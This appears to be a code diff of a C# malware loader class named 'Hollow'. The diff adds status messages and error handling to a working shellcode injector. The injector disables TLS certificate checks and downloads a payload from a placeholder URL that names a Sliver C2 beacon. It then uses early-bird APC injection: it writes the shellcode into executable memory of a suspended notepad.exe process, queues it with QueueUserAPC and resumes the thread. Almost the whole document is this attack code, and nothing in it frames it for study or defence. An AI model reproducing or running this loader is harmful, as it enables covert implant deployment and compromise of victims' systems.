@@ -54,26 +54,62 @@ class Hollow {
     }
 
     static void Main(string[] args) {
-        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+        Console.WriteLine("[*] Starting loader...");
         
-        WebClient wc = new WebClient();
-        byte[] shellcode = wc.DownloadData("http://--yourhstedDOTbinfile");
-        
-        STARTUPINFO si = new STARTUPINFO();
-        si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
-        PROCESS_INFORMATION pi;
-        
-        CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, 
-            false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
-        
-        IntPtr allocMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 
-            0x1000 | 0x2000, 0x40);
-        
-        WriteProcessMemory(pi.hProcess, allocMem, shellcode, (uint)shellcode.Length, out _);
-        
-        QueueUserAPC(allocMem, pi.hThread, IntPtr.Zero);
-        
-        ResumeThread(pi.hThread);
+        try {
+            Console.WriteLine("[*] Setting up SSL bypass...");
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+            
+            Console.WriteLine("[*] Downloading payload...");
+            WebClient wc = new WebClient();
+            byte[] shellcode = wc.DownloadData("http://YourSLIVERC2BEACON.bin");
+            Console.WriteLine($"[+] Downloaded {shellcode.Length} bytes");
+            
+            Console.WriteLine("[*] Creating suspended process...");
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
+            PROCESS_INFORMATION pi;
+            
+            bool success = CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, 
+                false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
+            
+            if (!success) {
+                Console.WriteLine("[-] Failed to create process");
+                return;
+            }
+            Console.WriteLine($"[+] Process created with PID: {pi.dwProcessId}");
+            
+            Console.WriteLine("[*] Allocating memory in target process...");
+            IntPtr allocMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 
+                0x1000 | 0x2000, 0x40);
+            
+            if (allocMem == IntPtr.Zero) {
+                Console.WriteLine("[-] Memory allocation failed");
+                return;
+            }
+            Console.WriteLine($"[+] Allocated memory at: 0x{allocMem.ToInt64():X}");
+            
+            Console.WriteLine("[*] Writing shellcode to process memory...");
+            int bytesWritten;
+            WriteProcessMemory(pi.hProcess, allocMem, shellcode, (uint)shellcode.Length, out bytesWritten);
+            Console.WriteLine($"[+] Wrote {bytesWritten} bytes");
+            
+            Console.WriteLine("[*] Queuing APC to thread...");
+            QueueUserAPC(allocMem, pi.hThread, IntPtr.Zero);
+            Console.WriteLine("[+] APC queued");
+            
+            Console.WriteLine("[*] Resuming thread...");
+            ResumeThread(pi.hThread);
+            Console.WriteLine("[+] Thread resumed");
+            
+            Console.WriteLine("[+] Injection complete!");
+            Console.WriteLine("[*] Press any key to exit...");
+            Console.ReadKey();
+            
+        } catch (Exception ex) {
+            Console.WriteLine($"[-] Error: {ex.Message}");
+            Console.WriteLine($"[-] Stack trace: {ex.StackTrace}");
+        }
     }
 }
